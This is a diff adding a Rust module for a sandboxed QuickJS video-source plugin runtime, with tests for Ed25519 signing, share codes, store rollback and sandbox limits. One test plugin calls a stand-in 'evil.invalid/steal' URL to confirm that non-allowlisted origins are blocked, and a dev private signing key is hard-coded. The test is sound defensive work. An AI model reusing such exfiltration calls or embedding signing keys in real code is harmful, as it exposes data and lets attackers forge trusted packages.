@@ -1,0 +1,277 @@
+//! Sandboxed video-source plugin runtime, Ed25519 verification, share-code codec, and atomic store.
+
+pub(crate) mod commands;
+pub(crate) mod manifest;
+pub(crate) mod runtime;
+pub(crate) mod store;
+pub(crate) mod verify;
+
+use once_cell::sync::Lazy;
+use std::path::Path;
+use std::sync::Arc;
+use store::SourceStore;
+
+static STORE: Lazy<Arc<SourceStore>> = Lazy::new(|| Arc::new(SourceStore::new()));
+
+pub(crate) fn store_arc() -> Arc<SourceStore> {
+    Arc::clone(&STORE)
+}
+
+pub fn bind(app_data_dir: &Path) {
+    STORE.bind(app_data_dir);
+}
+
+#[allow(unused_imports)]
+pub(crate) use commands::{try_detail, try_home, try_hot_tags, try_play, try_search};
+
+#[cfg(test)]
+mod tests {
+    use super::manifest::{
+        decode_package_input, encode_share_code, validate_package, CatalogCapabilities,
+        DetailCapabilities, PlaybackCapabilities, SourceCapabilities, SourceManifest,
+        SourceNetwork, SourcePackage, SourceRuntime,
+    };
+    use super::runtime::invoke_source;
+    use super::store::SourceStore;
+    use super::verify::{sign_for_test, verify_package};
+    use base64::engine::general_purpose::STANDARD as B64_STD;
+    use base64::Engine;
+    use serde_json::json;
+    use std::sync::Arc;
+
+    // Experimental dev PKCS#8 private key matching `TRUSTED_KEYS["exp-dev-2026"]`.
+    const DEV_PKCS8_B64: &str = "MC4CAQAwBQYDK2VwBCIEIKTl5Ek9vQjhNCsOmKAMnJoLFTcKAmx6i0C2u5Y5kMcF";
+
+    fn sample_pkg(version: &str, code: &str) -> SourcePackage {
+        SourcePackage {
+            schema_version: 1,
+            manifest: SourceManifest {
+                schema_version: 1,
+                id: "com.hghubx.fake-test".into(),
+                name: "测试模拟源".into(),
+                version: version.into(),
+                api_version: "1".into(),
+                description: "离线契约测试源".into(),
+                author: "test".into(),
+                runtime: SourceRuntime {
+                    kind: "quickjs".into(),
+                    entry: "inline".into(),
+                },
+                network: SourceNetwork {
+                    origins: vec!["https://example.com".into()],
+                    media_origins: vec!["https://cdn.example.com".into()],
+                    publish_origins: vec![],
+                },
+                capabilities: SourceCapabilities {
+                    home: true,
+                    search: true,
+                    catalog: CatalogCapabilities {
+                        categories: false,
+                        tags: true,
+                        rankings: false,
+                    },
+                    detail: DetailCapabilities {
+                        episodes: true,
+                        related: false,
+                        comments: false,
+                    },
+                    playback: PlaybackCapabilities {
+                        hls: true,
+                        mp4: true,
+                        subtitles: false,
+                    },
+                    posts: false,
+                    account: false,
+                    lines: false,
+                },
+            },
+            code: code.into(),
+            update_urls: vec![],
+            signature: None,
+        }
+    }
+
+    const FAKE_SOURCE_JS: &str = r#"
+module.exports = {
+  init() { return { ok: true }; },
+  home({ page, size }) {
+    return {
+      items: [{ id: 1001, title: "离线示例短剧", cover: "", tags: ["测试"], score: 9.2, episode_count: 10, total_episodes: 10, hot: 999, is_finished: true }],
+      pagination: { page: page || 1, pages: 1, size: size || 20, total: 1 }
+    };
+  },
+  search({ q, page, size }) {
+    const hash = host.crypto.sha256Hex(q || "").slice(0, 6);
+    const items = host.htmlQuery("<ul><li data-id='1'>都市逆袭</li><li>甜宠</li></ul>", "li");
+    return {
+      items: [{ id: 2001, title: `${items[0].text}-${hash}`, cover: "", tags: ["测试"], score: 9.5, episode_count: 12, total_episodes: 12, hot: 5000, is_finished: true }],
+      pagination: { page: page || 1, pages: 1, size: size || 20, total: 1 },
+      keyword: q || ""
+    };
+  },
+  detail({ id }) {
+    host.storage.set("last_detail", String(id));
+    return {
+      id,
+      title: "离线示例短剧",
+      episodes: [{ ep_num: 1, title: "第1集" }, { ep_num: 2, title: "第2集" }],
+      counts: { like: 10, collect: 5, comment: 2, hot: 999 }
+    };
+  },
+  playback({ id, ep }) {
+    return {
+      id: String(id),
+      ep,
+      video_url: "https://cdn.example.com/demo.m3u8"
+    };
+  },
+  hotTags() {
+    const nodes = host.htmlQuery("<div><a href='/t/a'>逆袭</a><a href='/t/b'>甜宠</a></div>", "a");
+    return { items: nodes.map(n => ({ name: n.text, slug: n.attrs.href })) };
+  }
+};
+"#;
+
+    #[test]
+    fn share_code_roundtrip_and_ed25519_verification() {
+        let mut pkg = sample_pkg("1.0.0", FAKE_SOURCE_JS);
+        let pkcs8 = B64_STD.decode(DEV_PKCS8_B64).unwrap();
+        sign_for_test(&mut pkg, &pkcs8, "exp-dev-2026", true);
+
+        let code = encode_share_code(&pkg).unwrap();
+        assert!(code.starts_with("hghubx-src://"));
+        let decoded = decode_package_input(&code).unwrap();
+        validate_package(&decoded).unwrap();
+        let info = verify_package(&decoded, false).unwrap();
+        assert_eq!(info.status, "trusted");
+        assert_eq!(info.key_id, "exp-dev-2026");
+
+        // Tampering a single byte of code must ALWAYS fail verification, even with allow_untrusted=true.
+        let mut tampered = decoded.clone();
+        tampered.code.push(' ');
+        assert!(verify_package(&tampered, true).is_err());
+
+        // Unsigned rejected by default, accepted only with allow_untrusted=true.
+        let unsigned = sample_pkg("1.0.0", FAKE_SOURCE_JS);
+        assert!(verify_package(&unsigned, false).is_err());
+        assert_eq!(verify_package(&unsigned, true).unwrap().status, "unsigned");
+    }
+
+    #[test]
+    fn atomic_store_upgrade_and_rollback_preserve_state() {
+        let dir = std::env::temp_dir().join(format!("hghubx-src-test-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let store = SourceStore::new();
+        store.bind(&dir);
+
+        let mut p1 = sample_pkg("1.0.0", FAKE_SOURCE_JS);
+        let pkcs8 = B64_STD.decode(DEV_PKCS8_B64).unwrap();
+        sign_for_test(&mut p1, &pkcs8, "exp-dev-2026", false);
+        let sig1 = verify_package(&p1, false).unwrap();
+        let s1 = store.install(p1, sig1, true).unwrap();
+        assert_eq!(s1.version, "1.0.0");
+        assert!(s1.active);
+        store.kv_set(&s1.id, "cursor", Some("abc".into())).unwrap();
+
+        let mut p2 = sample_pkg("1.1.0", FAKE_SOURCE_JS);
+        sign_for_test(&mut p2, &pkcs8, "exp-dev-2026", false);
+        let sig2 = verify_package(&p2, false).unwrap();
+        let s2 = store.install(p2, sig2, false).unwrap();
+        assert_eq!(s2.version, "1.1.0");
+        assert_eq!(s2.previous_version.as_deref(), Some("1.0.0"));
+        assert_eq!(store.kv_get(&s2.id, "cursor").as_deref(), Some("abc"));
+
+        let rolled = store.rollback(&s2.id).unwrap();
+        assert_eq!(rolled.version, "1.0.0");
+        assert_eq!(rolled.previous_version.as_deref(), Some("1.1.0"));
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[tokio::test]
+    async fn quickjs_sandbox_executes_contract_crypto_html_storage_and_blocks_infinite_loop() {
+        let store = Arc::new(SourceStore::new());
+        let pkg = sample_pkg("1.0.0", FAKE_SOURCE_JS);
+
+        let res = invoke_source(store.clone(), pkg.clone(), "search", json!({ "q": "都市", "page": 1, "size": 5 }), Some(5))
+            .await
+            .unwrap();
+        assert_eq!(res["items"][0]["id"], 2001);
+        assert!(res["items"][0]["title"].as_str().unwrap().starts_with("都市逆袭-"));
+
+        let det = invoke_source(store.clone(), pkg.clone(), "detail", json!({ "id": 1001 }), Some(5))
+            .await
+            .unwrap();
+        assert_eq!(det["episodes"].as_array().unwrap().len(), 2);
+        assert_eq!(store.kv_get("com.hghubx.fake-test", "last_detail").as_deref(), Some("1001"));
+
+        let tags = invoke_source(store.clone(), pkg.clone(), "hotTags", json!({}), Some(5))
+            .await
+            .unwrap();
+        assert_eq!(tags["items"][0]["name"], "逆袭");
+
+        // Crypto round-trip: ECDH P-256 + HKDF-SHA256 + AES-256-GCM inside QuickJS!
+        let crypto_pkg = sample_pkg("1.0.0", r#"
+module.exports = {
+  init() {
+    const a = host.crypto.ecdhP256Create();
+    const b = host.crypto.ecdhP256Create();
+    const salt = host.crypto.randomBytes(32).b64url;
+    const ka = host.crypto.ecdhP256Derive(a.handle, b.publicKeyB64Url, salt, ["k1", "k2"]);
+    const kb = host.crypto.ecdhP256Derive(b.handle, a.publicKeyB64Url, salt, ["k1", "k2"]);
+    if (ka[0] !== kb[0] || ka[1] !== kb[1]) throw new Error("ECDH mismatch");
+    const nonce = host.crypto.randomBytes(12).b64;
+    const enc = host.crypto.aes256GcmEncrypt({ keyB64: ka[0], nonceB64: nonce, plaintextUtf8: "hello-dx150", aadUtf8: "aad-1" });
+    const dec = host.crypto.aes256GcmDecrypt({ keyB64: kb[0], nonceB64: nonce, ciphertextB64Url: enc.ciphertextB64Url, aadUtf8: "aad-1" });
+    return { ok: dec.plaintextUtf8 === "hello-dx150", text: dec.plaintextUtf8 };
+  }
+};
+"#);
+        let crypto_res = invoke_source(store.clone(), crypto_pkg, "init", json!({}), Some(5))
+            .await
+            .unwrap();
+        assert_eq!(crypto_res["ok"], true);
+        assert_eq!(crypto_res["text"], "hello-dx150");
+
+        // Security: origin outside manifest.network.origins MUST be blocked.
+        let ssrf_pkg = sample_pkg("1.0.0", r#"
+module.exports = {
+  init() {
+    return host.fetch({ url: "https://evil.invalid/steal" });
+  }
+};
+"#);
+        let err = invoke_source(store.clone(), ssrf_pkg, "init", json!({}), Some(5))
+            .await
+            .unwrap_err();
+        assert!(err.contains("白名单"), "unexpected err: {err}");
+
+        // Safety: infinite loop is terminated cleanly by QuickJS interrupt handler.
+        let loop_pkg = sample_pkg("1.0.0", "module.exports = { init() { while(true) {} } };");
+        let err = invoke_source(store.clone(), loop_pkg, "init", json!({}), Some(1))
+            .await
+            .unwrap_err();
+        assert!(err.contains("超时") || err.contains("interrupted"), "unexpected err: {err}");
+
+        // Verify both shipped example sources load & pass init() in QuickJS (and demo-offline serves items).
+        let repo_root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
+        for dir in ["examples/sources/demo-offline", "examples/sources/huangguo"] {
+            let base = repo_root.join(dir);
+            let mut m: SourceManifest = serde_json::from_str(&std::fs::read_to_string(base.join("manifest.json")).unwrap()).unwrap();
+            m.runtime.entry = "inline".into();
+            let code = std::fs::read_to_string(base.join("source.js")).unwrap();
+            let mut ex = SourcePackage { schema_version: 1, manifest: m, code, update_urls: vec![], signature: None };
+            let pkcs8 = B64_STD.decode(DEV_PKCS8_B64).unwrap();
+            sign_for_test(&mut ex, &pkcs8, "exp-dev-2026", true);
+            validate_package(&ex).unwrap();
+            assert_eq!(verify_package(&ex, false).unwrap().status, "trusted");
+            let init_res = invoke_source(store.clone(), ex.clone(), "init", json!({}), Some(5)).await.unwrap();
+            assert_eq!(init_res["ok"], true);
+            if dir.ends_with("demo-offline") {
+                let h = invoke_source(store.clone(), ex.clone(), "home", json!({ "page": 1, "size": 10 }), Some(5)).await.unwrap();
+                assert_eq!(h["items"].as_array().unwrap().len(), 2);
+                let s = invoke_source(store.clone(), ex, "search", json!({ "q": "逆袭", "page": 1, "size": 10 }), Some(5)).await.unwrap();
+                assert_eq!(s["items"].as_array().unwrap().len(), 1);
+            }
+        }
+    }
+}
